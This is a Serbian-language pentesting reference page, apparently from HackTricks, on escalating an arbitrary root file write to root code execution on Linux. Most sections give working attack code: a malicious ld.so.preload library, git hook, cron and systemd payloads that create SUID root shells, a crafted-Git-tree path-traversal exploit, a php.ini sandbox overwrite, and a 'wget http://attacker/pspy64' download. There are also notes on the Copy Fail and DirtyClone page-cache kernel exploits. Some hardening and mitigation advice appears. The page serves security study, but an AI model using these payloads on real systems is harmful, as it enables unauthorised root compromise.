# Proizvoljni upis u fajl kao root

{{#include ../../banners/hacktricks-training.md}}

### /etc/ld.so.preload

`/etc/ld.so.preload` je sistemska lista deljenih objekata koje dynamic linker učitava pre drugih deljenih objekata. Režim bezbednog izvršavanja primenjuje dodatna ograničenja na preloading, tako da putanja biblioteke kao što je `/tmp/pe.so` nije univerzalna tehnika za SUID-binary.\
Ako možete da kreirate ili izmenite ovaj fajl, proces koji ga učita učitaće navedenu biblioteku pre svojih drugih deljenih objekata, što omogućava izvršavanje koda u kontekstu tog procesa.<sup>[[12]](#references)</sup>

Na primer: `echo "/tmp/pe.so" > /etc/ld.so.preload`
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
unlink("/etc/ld.so.preload");
setgid(0);
setuid(0);
system("/bin/bash");
}
//cd /tmp
//gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
### Git hooks

**Git hooks** su izvršne skripte koje se pokreću za događaje u repozitorijumu, uključujući commit i merge operacije. Ako **privileged script ili user** obavlja te radnje, a napadač može da **upisuje u `.git` folder**, hook može da se iskoristi za **privilege escalation**.<sup>[[13]](#references)</sup>

Na primer, moguće je **generisati skriptu** u git repozitorijumu u direktorijumu **`.git/hooks`**, tako da se uvek izvršava kada se kreira novi commit:
```bash
echo -e '#!/bin/bash\n\ncp /bin/bash /tmp/0xdf\nchown root:root /tmp/0xdf\nchmod 4777 /tmp/0xdf' > pre-commit
chmod +x pre-commit
```
### Privileged Git tree export path traversal

Privileged synchronizer može izbeći checkout i umesto toga enumerisati repository pod uticajem napadača pomoću `git ls-tree`, pročitati svaki blob pomoću `git cat-file`, spojiti prijavljenu putanju sa staging direktorijumom i sam je upisati. Ovo postaje **arbitrary file write sa privilegijama synchronizer-a** kada kombinuje `-c safe.directory=*` (čime se onemogućava Git-ova zaštita za repository u vlasništvu drugog korisnika) sa nepostojanjem provere ograničenja odredišta. Apsolutno ime tree-entry-ja dovodi do toga da Python-ov `os.path.join(stage, name)` odbaci `stage`; relativno ime koje sadrži `../` izlazi iz dozvoljenog direktorijuma kada ga filesystem razreši. Pošto aplikacija materijalizuje sirovi tree umesto da zatraži od Git-a da ga checkout-uje, odbijanje putanja tokom checkout-a nikada ne štiti sink.<sup>[[30]](#references)[[32]](#references)[[33]](#references)</sup>

Potražite ovaj oblik koda u root servisima, timer-ima, deployment agentima, importer-ima template-a i backup/restore poslovima:<sup>[[30]](#references)</sup>
```python
entries = git("-c", "safe.directory=*", "ls-tree", "-rz", "HEAD")
for mode, oid, git_path in parse(entries):
target = os.path.join(stage_root, git_path)  # no containment check
os.makedirs(os.path.dirname(target), exist_ok=True)
with open(target, "wb") as output:
output.write(git("cat-file", "blob", oid))
```
Tree entry je kodiran kao `<mode> SP <name> NUL <raw object ID>`. Opcija `git hash-object --literally` namerno dozvoljava podatke objekta koje uobičajeno parsiranje ili `git fsck` mogu odbaciti, pa disposable clone može da konstruiše tree čije je ime fajla apsolutna destinacija. Ovaj primer kreira blob cron fajla, obavija kreirani tree u commit i pomera branch na njega; eksploatacija i dalje zahteva dozvolu za ažuriranje repository-ja koji koristi privilegovani job i Git server koji prihvata neispravan objekat.<sup>[[30]](#references)[[31]](#references)</sup>
```bash
blob=$(printf '%s\n' '* * * * * root cp /bin/bash /tmp/rootbash && chmod 6755 /tmp/rootbash' | git hash-object -w --stdin)
{ printf '100644 /etc/cron.d/git-sync\0'; printf '%s' "$blob" | xxd -r -p; } > tree.raw
tree=$(git hash-object -w -t tree --literally --stdin < tree.raw)
commit=$(printf 'crafted tree\n' | git commit-tree "$tree")
git update-ref refs/heads/main "$commit"
git ls-tree -r main
git push --force origin main
```
Hardening mora obuhvatiti i unos iz repository-ja i završnu operaciju nad filesystem-om:<sup>[[30]](#references)[[33]](#references)[[34]](#references)</sup>

- Zamenite `safe.directory=*` tačnim repository-jima kojima servis mora verovati i, gde je moguće, obrađujte repository bez root privilegija.
- Odbijte apsolutna imena i svaku `.` ili `..` komponentu pre materializacije. Nakon spajanja, kanonikalizujte putanju i proverite da odredište ostaje unutar predviđenog root direktorijuma.
- Izbegavajte symlink race uslove tipa check-then-open: otvarajte relativno u odnosu na pouzdani directory descriptor i, na Linux-u, koristite `openat2()` sa `RESOLVE_BENEATH` i `RESOLVE_NO_SYMLINKS` za putanje pod kontrolom napadača.
- Dajte prednost uobičajenom checkout-u u izolovanom direktorijumu umesto ponovne implementacije checkout-a iz plumbing output-a. Ako je potreban unos raw objekata, omogućite validaciju na receive strani, kao što je `receive.fsckObjects=true`; nemojte snižavati nivo `receive.fsck.*` nalaza povezanih sa putanjama, koji su potrebni za odbacivanje posebno napravljenih tree-ova.

### Cron i vremenske datoteke

Ako možete **pisati cron-related datoteke koje root izvršava**, obično možete dobiti izvršavanje koda pri sledećem pokretanju posla. Zanimljive mete obuhvataju:<sup>[[14]](#references)[[20]](#references)</sup>

- `/etc/crontab`
- `/etc/cron.d/*`
- `/etc/cron.hourly/*`, `/etc/cron.daily/*`, `/etc/cron.weekly/*`, `/etc/cron.monthly/*`
- Root-ov sopstveni crontab u `/var/spool/cron/` ili `/var/spool/cron/crontabs/`
- `systemd` timer-i i servisi koje pokreću

Brze provere:
```bash
ls -la /etc/crontab /etc/cron.d /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly 2>/dev/null
find /var/spool/cron* -maxdepth 2 -type f -ls 2>/dev/null
systemctl list-timers --all 2>/dev/null
grep -R "run-parts\\|cron" /etc/crontab /etc/cron.* /etc/cron.d 2>/dev/null
```
Tipični načini zloupotrebe:

- **Dodavanje novog root cron posla** u `/etc/crontab` ili fajl u `/etc/cron.d/`
- **Zamena skripte** koju `run-parts` već izvršava
- **Ubacivanje backdoor-a u postojeći timer target** izmenom skripte ili binarnog fajla koji pokreće

Minimalni primer cron payload-a:
```bash
echo '* * * * * root cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash' >> /etc/crontab
```
Ako možete da upisujete samo u cron direktorijum koji koristi `run-parts`, umesto toga tamo postavite izvršnu datoteku:
```bash
cat > /etc/cron.daily/backup <<'EOF'
#!/bin/sh
cp /bin/bash /tmp/rootbash
chown root:root /tmp/rootbash
chmod 4777 /tmp/rootbash
EOF
chmod +x /etc/cron.daily/backup
```
Napomene:

- `run-parts` obično ignoriše nazive fajlova koji sadrže tačke, zato koristite nazive poput `backup` umesto `backup.sh`.<sup>[[15]](#references)</sup>
- Neki sistemi koriste `systemd` timers umesto klasičnog cron-a, ali ideja zloupotrebe je ista: **izmeniti ono što će root kasnije izvršiti**.<sup>[[20]](#references)</sup>

### Service & Socket files

Ako možete da upisujete u **`systemd` unit files** ili fajlove na koje oni upućuju, možda ćete moći da izvršite kod kao root ponovnim učitavanjem i restartovanjem unit-a ili čekanjem da se aktivira service/socket activation putanja.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)</sup>

Zanimljive mete uključuju:

- `/etc/systemd/system/*.service`
- `/etc/systemd/system/*.socket`
- Drop-in overrides u `/etc/systemd/system/<unit>.d/*.conf`
- Service scripts/binaries na koje upućuju `ExecStart=`, `ExecStartPre=`, `ExecStartPost=`
- Writable `EnvironmentFile=` putanje koje učitava root service

Brze provere:
```bash
ls -la /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
systemctl list-units --type=service --all 2>/dev/null
systemctl list-units --type=socket --all 2>/dev/null
grep -R "^ExecStart=\\|^EnvironmentFile=\\|^ListenStream=" /etc/systemd/system /lib/systemd/system /usr/lib/systemd/system 2>/dev/null
```
Uobičajeni načini zloupotrebe:

- **Overwrite `ExecStart=`** u systemd service unit-u u vlasništvu root korisnika koji možete da menjate
- **Add a drop-in override** sa zlonamernim `ExecStart=` i prvo obrišite staru vrednost
- **Backdoor** skripte/binarnog fajla na koji unit već upućuje
- **Hijack a socket-activated service** izmenom odgovarajućeg `.service` fajla koji se pokreće kada socket primi konekciju

Primer zlonamernog override-a:
```ini
[Service]
ExecStart=
ExecStart=/bin/sh -c 'cp /bin/bash /tmp/rootbash && chown root:root /tmp/rootbash && chmod 4777 /tmp/rootbash'
```
Tipičan tok aktivacije:
```bash
systemctl daemon-reload
systemctl restart vulnerable.service
# or trigger the socket-backed service by connecting to it
```
Ako ne možete sami ponovo da pokrenete servise, ali možete da izmenite unit aktiviran putem socket-a, možda je potrebno samo da **sačekate povezivanje klijenta** kako biste pokrenuli izvršavanje backdoored servisa sa root privilegijama.<sup>[[17]](#references)</sup>

### Prepisivanje restriktivnog `php.ini` fajla koji koristi privilegovani PHP sandbox

Neki prilagođeni daemoni proveravaju PHP koji je uneo korisnik tako što pokreću `php` sa **restriktivnim `php.ini` fajlom** (na primer, `disable_functions=exec,system,...`). Ako kod pokrenut u sandbox-u i dalje ima **bilo kakav mehanizam za upis** (kao što je `file_put_contents`) i možete da pristupite **tačnoj putanji do fajla `php.ini`** koju daemon koristi, možete **prepisati tu konfiguraciju** da biste uklonili ograničenja, a zatim poslati drugi payload koji se izvršava sa povišenim privilegijama.<sup>[[2]](#references)</sup>

Tipičan tok:

1. Prvi payload prepisuje konfiguraciju sandbox-a.
2. Drugi payload izvršava kod nakon što su opasne funkcije ponovo omogućene.

Minimalni primer (zamenite putanju onom koju koristi daemon):
```php
<?php
file_put_contents('/path/to/sandbox/php.ini', "disable_functions=\n");
```
Ako daemon radi kao root (ili validira putanje u vlasništvu root-a), drugo izvršavanje dobija root kontekst. Ovo je u suštini **privilege escalation via config overwrite** kada sandboxed runtime i dalje može da upisuje datoteke.

### binfmt_misc

`binfmt_misc` izlaže registracije u okviru `/proc/sys/fs/binfmt_misc`; svaka registracija povezuje obrazac tipa datoteke sa interpreterom. Uticaj na privilegije zavisi od toga ko može da menja registraciju i koji proces kasnije izvršava datoteku koja joj odgovara, zato proverite te uslove pre nego što ovo smatrate putem za privilege escalation.<sup>[[21]](#references)</sup>

### Overwrite schema handlers (like http: or https:)

Desktop okruženja koriste MIME asocijacije i desktop entries za izbor aplikacije za URI scheme-ove; attacker koji može da upisuje u relevantnu konfiguraciju po korisniku i direktorijume sa desktop entries može da preusmeri te scheme-ove na launcher koji kontroliše. Izmenom fajla `$HOME/.config/mimeapps.list` tako da HTTP i HTTPS URL handler-i upućuju na malicious fajl (na primer, `x-scheme-handler/http=evil.desktop` i `x-scheme-handler/https=evil.desktop`), klik korisnika može da pokrene taj desktop entry.<sup>[[22]](#references)[[23]](#references)[[24]](#references)</sup>
```bash
[Desktop Entry]
Type=Application
Name=Evil Desktop Entry
Exec=/bin/sh -c "id > /tmp/mime-handler-pwned"
MimeType=x-scheme-handler/http;x-scheme-handler/https;
```
### Root izvršava skripte/binarne datoteke koje korisnik može da menja

Ako privileged workflow pokreće nešto poput `/bin/sh /home/username/.../script` (ili bilo koju binarnu datoteku unutar direktorijuma čiji je vlasnik unprivileged user), možete da preuzmete kontrolu nad tim procesom:<sup>[[1]](#references)</sup>

- **Otkrivanje izvršavanja:** nadgledajte procese pomoću pspy da biste uhvatili trenutak kada root poziva putanje pod kontrolom korisnika.<sup>[[25]](#references)</sup>
```bash
wget http://attacker/pspy64 -O /dev/shm/pspy64
chmod +x /dev/shm/pspy64
/dev/shm/pspy64   # wait for root commands pointing to your writable path
```
- **Potvrdi mogućnost upisivanja:** uveri se da su i ciljna datoteka i njen direktorijum u vlasništvu tvog korisnika ili da korisnik ima dozvolu za upis.
- **Preuzmi cilj:** napravi backup originalnog binary/script fajla i ubaci payload koji kreira SUID shell (ili izvršava neku drugu root radnju), zatim vrati dozvole:
```bash
mv server-command server-command.bk
cat > server-command <<'EOF'
#!/bin/bash
cp /bin/bash /tmp/rootshell
chown root:root /tmp/rootshell
chmod 6777 /tmp/rootshell
EOF
chmod +x server-command
```
- **Pokrenite privilegovanu radnju** (npr. pritiskom na UI dugme koje pokreće helper). Kada root ponovo izvrši hijacked putanju, preuzmite escalated shell pomoću `./rootshell -p`.

### Izmena privilegovanih binarnih datoteka samo u page cache-u

Neki kernel bug-ovi ne menjaju datoteku **na disku**. Umesto toga, omogućavaju izmenu samo **kopije u page cache-u** čitljive datoteke. Ako možete ciljati **setuid** ili na drugi način **root-executed** binarnu datoteku, sledeće izvršavanje može pokrenuti bytes pod kontrolom napadača iz memorije i dovesti do eskalacije privilegija, iako hash datoteke na disku ostaje nepromenjen.<sup>[[3]](#references)[[4]](#references)</sup>

O ovome je korisno razmišljati kao o **runtime-only file write primitive**:<sup>[[3]](#references)</sup>

- **Disk ostaje čist**: inode i bytes na disku se ne menjaju
- **Memorija je izmenjena**: procesi koji čitaju/izvršavaju keširanu stranicu dobijaju sadržaj izmenjen od strane napadača
- **Efekat je privremen**: izmena nestaje nakon reboot-a ili izbacivanja iz cache-a

Ovaj primitive se nalazi između klasičnog **arbitrary file write** i starijih bug-ova za **page-cache abuse**, kao što su Dirty COW / Dirty Pipe:<sup>[[3]](#references)</sup>

- Dirty COW se oslanjao na race
- Dirty Pipe je imao ograničenja pozicije upisa
- Page-cache-only primitive može biti pouzdaniji ako ranjiva putanja omogućava direktne upise u keširane file-backed stranice

#### Generic privesc flow

1. Nabavite kernel primitive koji može da upisuje u **file-backed page cache pages**
2. Iskoristite ga protiv **readable privileged binary** datoteke ili druge root-executed datoteke
3. Pokrenite izvršavanje **pre** nego što stranica bude izbačena iz cache-a
4. Dobijte code execution kao root dok datoteka na disku i dalje izgleda neizmenjeno

Tipične visokovredne mete:

- **setuid-root** binarne datoteke
- Helper-i koje pokreću **root services**
- Binarne datoteke koje se često izvršavaju iz **containers** koji dele host kernel/page cache

#### AF_ALG + `splice()` example path

Copy Fail (CVE-2026-31431) je dobar primer ove klase. Ranjiva putanja nalazila se u Linux crypto userspace API-ju (`AF_ALG` / `algif_aead`):<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)[[7]](#references)</sup>

- `splice()` može da premesti reference ka page-cache stranicama iz čitljive datoteke u crypto TX scatterlist
- in-place `algif_aead` decrypt path ponovo je koristio source i destination buffers
- `authencesn` je zatim upisivao u destination tag region
- kada je taj region i dalje referencirao spliced file-backed stranice, upis je završavao u **page cache-u ciljne datoteke**

Dakle, zanimljiva tehnika nije sam CVE, već obrazac:

- **proslediti file-backed cache pages kernel subsystem-u**
- naterati subsystem da ih **tretira kao writable output**
- pokrenuti mali kontrolisani overwrite u memoriji

Javni PoC je koristio ponovljene **4-byte writes** za izmenu `/usr/bin/su` u memoriji, a zatim ga je izvršio.<sup>[[4]](#references)[[7]](#references)</sup>

#### ESP / XFRM + netfilter TEE clone example path

DirtyClone (CVE-2026-43503) prikazuje drugu varijantu istog obrasca **page-cache-only write-to-root**, ali je ovog puta sink **IPsec ESP decrypt**, a ne `AF_ALG`.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

Važna tehnika je korak **metadata-laundering**:

- `splice()` postavlja **read-only file-backed page-cache page** u ESP-in-UDP paket
- originalni DirtyFrag mitigation označava taj skb sa `SKBFL_SHARED_FRAG`, kako bi `esp_input()` **kopirao pre decrypting-a**
- netfilter `TEE` duplicira paket kroz `nf_dup_ipv4()` -> `__pskb_copy_fclone()`
- clone zadržava **istu fizičku page-cache referencu**, ali gubi `SKBFL_SHARED_FRAG`
- `esp_input()` zatim tretira clone kao bezbedan i pokreće **in-place `cbc(aes)` decrypt** nad file-backed stranicom

Dakle, lekcija za review je šira od samog CVE-a: ako mitigation zavisi od **skb/page metadata** kako bi odlučio da li operacija prvo mora da izvrši copy, bilo koji **clone/copy path koji očuva backing page, ali ukloni metadata** može neprimetno ponovo otvoriti write primitive.

Tipičan exploitation flow:

1. `unshare(CLONE_NEWUSER | CLONE_NEWNET)` za dobijanje **`CAP_NET_ADMIN` unutar privatnog network namespace-a**
2. podići loopback i instalirati **netfilter `TEE` rule** u `mangle/OUTPUT`
3. instalirati **XFRM ESP transport SAs** putem `NETLINK_XFRM`
4. enkodovati svaku ciljnu 4-byte reč u SA `seq_hi` field (DirtyFrag-ov trik za izbor reči)
5. poslati spliced ESP-in-UDP paket tako da **TEE clone** stigne do `esp_input()` i izvrši decrypt **in place**
6. ponavljati dok page-cache copy datoteke `/usr/bin/su` ili drugog privilegovanog executable-a ne sadrži code pod kontrolom napadača

Operativno, uticaj je isti kao u `AF_ALG` primeru: datoteka na disku ostaje čista, ali `execve()` koristi **izmenjene bytes iz page cache-a** i daje root.<sup>[[8]](#references)[[9]](#references)</sup>

Korisne provere izloženosti za ovu varijantu:
```bash
unshare -Urn true 2>/dev/null && echo "user+net namespaces available"
sysctl kernel.apparmor_restrict_unprivileged_userns 2>/dev/null
modprobe -n -v xt_TEE 2>/dev/null
modprobe -n -v esp4 2>/dev/null
modprobe -n -v esp6 2>/dev/null
lsmod | egrep 'xt_TEE|nf_dup_ipv4|esp4|esp6|x_tables'
```
Kratkoročno smanjenje attack-surface-a je i ovde specifično za putanju: nadogradnja na kernel koji sadrži `48f6a5356a33` popravlja clone putanju, dok blokiranje autoload-a za `xt_TEE` uklanja **flag-laundering step**, a blokiranje `esp4` / `esp6` uklanja **decrypt sink**.<sup>[[8]](#references)[[9]](#references)[[10]](#references)[[11]](#references)</sup>

#### Izloženost i hunting

Ako sumnjate na ovu klasu greške, nemojte se oslanjati samo na provere integriteta diska. Takođe proverite:
```bash
uname -r
grep CONFIG_CRYPTO_USER_API_AEAD= /boot/config-$(uname -r) 2>/dev/null
lsmod | grep algif_aead
find / -perm -4000 -type f 2>/dev/null
```
Vrednosti konfiguracije u nastavku razlikuju učitljiv interfejs od onog ugrađenog u kernel; crypto build pravila mapiraju `CONFIG_CRYPTO_USER_API_AEAD` na `algif_aead`.<sup>[[26]](#references)[[27]](#references)</sup>

- `CONFIG_CRYPTO_USER_API_AEAD=m`: `algif_aead` može da se učitava/uklanja kao modul
- `CONFIG_CRYPTO_USER_API_AEAD=y`: interfejs je ugrađen u kernel
- setuid binarni fajlovi su dobre mete jer patch koji menja samo page cache može biti dovoljan da lokalni foothold pretvori u root pristup

#### Smanjenje attack surface-a za `algif_aead` putanju

Ako ranjivi interfejs obezbeđuje učitljiv modul:<sup>[[6]](#references)[[28]](#references)[[29]](#references)</sup>
```bash
echo "install algif_aead /bin/false" > /etc/modprobe.d/disable-algif.conf
rmmod algif_aead 2>/dev/null || true
```
Ako je kompajlirano u kernel, u nekim disclosure-ima prijavljeno je blokiranje init putanje pomoću:<sup>[[28]](#references)</sup>
```bash
initcall_blacklist=algif_aead_init
```
Ovu vrstu mitigation-a vredi zapamtiti i za druge kernel LPE napade: ako exploitation zavisi od specifičnog opcionalnog interfejsa, onemogućavanje ili stavljanje tog interfejsa na blacklist može prekinuti exploit putanju čak i pre nego što bude dostupan potpuni kernel upgrade.<sup>[[6]](#references)[[28]](#references)</sup>

## References

- [1] [HTB Bamboo – preuzimanje script-a koji se izvršava kao root u PaperCut direktorijumu u koji korisnik može da upisuje](https://0xdf.gitlab.io/2026/02/03/htb-bamboo.html)
- [2] [HTB: Gavel](https://0xdf.gitlab.io/2026/03/14/htb-gavel.html)
- [3] [Tenable: Copy Fail (CVE-2026-31431) FAQ](https://www.tenable.com/blog/copy-fail-cve-2026-31431-frequently-asked-questions-about-linux-kernel-privilege-escalation)
- [4] [Openwall oss-security objava za CVE-2026-31431](https://www.openwall.com/lists/oss-security/2026/04/29/23)
- [5] [Linux stable fix: crypto: algif_aead - vraćanje na out-of-place operacije](https://git.kernel.org/stable/c/a664bf3d603dc3bdcf9ae47cc21e0daec706d7a5)
- [6] [Copy Fail — CVE-2026-31431 advisory](https://copy.fail/)
- [7] [Theori / Xint tehnički writeup](https://xint.io/blog/copy-fail-linux-distributions)
- [8] [DirtyClone repository / README](https://github.com/rafaeldtinoco/security/tree/main/exploits/dirtyclone)
- [9] [JFrog: analiza i exploitation Linux LPE varijante DirtyClone (CVE-2026-43503)](https://research.jfrog.com/post/dissecting-and-exploiting-linux-lpe-variant-dirtyclone-cve-2026-43503/)
- [10] [Linux fix: net: skb: očuvanje `SKBFL_SHARED_FRAG` u `__pskb_copy_fclone()` (`48f6a5356a33`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=48f6a5356a33)
- [11] [Linux ranija mitigation: postavljanje `SKBFL_SHARED_FRAG` za splice-ovane UDP pakete (`f4c50a4034e6`)](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=f4c50a4034e6)
- [12] [ld.so(8) — Linux manualna stranica](https://man7.org/linux/man-pages/man8/ld.so.8.html)
- [13] [Git Hooks](https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks)
- [14] [crontab(5) — Linux manualna stranica](https://man7.org/linux/man-pages/man5/crontab.5.html)
- [15] [run-parts(8) — Debian manualna stranica](https://manpages.debian.org/bookworm/debianutils/run-parts.8.en.html)
- [16] [systemd.service](https://github.com/systemd/systemd/blob/main/man/systemd.service.xml)
- [17] [systemd.socket](https://github.com/systemd/systemd/blob/main/man/systemd.socket.xml)
- [18] [systemd.unit](https://github.com/systemd/systemd/blob/main/man/systemd.unit.xml)
- [19] [systemd.exec](https://github.com/systemd/systemd/blob/main/man/systemd.exec.xml)
- [20] [systemd.timer](https://github.com/systemd/systemd/blob/main/man/systemd.timer.xml)
- [21] [binfmt_misc — Linux Kernel dokumentacija](https://www.kernel.org/doc/html/latest/admin-guide/binfmt-misc.html)
- [22] [MIME Applications Associations](https://specifications.freedesktop.org/mime-apps/1.0.1/file.html)
- [23] [Shared MIME-info specification](https://specifications.freedesktop.org/shared-mime-info/latest-single/)
- [24] [Desktop Entry specification](https://specifications.freedesktop.org/desktop-entry/latest-single/)
- [25] [pspy](https://github.com/DominicBreuker/pspy)
- [26] [Kconfig Language](https://docs.kernel.org/kbuild/kconfig-language.html)
- [27] [Linux crypto Makefile](https://raw.githubusercontent.com/torvalds/linux/master/crypto/Makefile)
- [28] [CERT VU#260001: AF_ALG ranjivost Linux kernela u page cache-u](https://kb.cert.org/vuls/id/260001)
- [29] [modprobe(8) — Linux manualna stranica](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [30] [0xdf — HTB: Nexus](https://0xdf.gitlab.io/2026/09/02/htb-nexus.html)
- [31] [Git dokumentacija za `hash-object`](https://git-scm.com/docs/git-hash-object)
- [32] [Git dokumentacija za `ls-tree`](https://git-scm.com/docs/git-ls-tree)
- [33] [Git dokumentacija za konfiguraciju](https://git-scm.com/docs/git-config)
- [34] [`openat2(2)` — Linux manualna stranica](https://man7.org/linux/man-pages/man2/openat2.2.html)
{{#include ../../banners/hacktricks-training.md}}
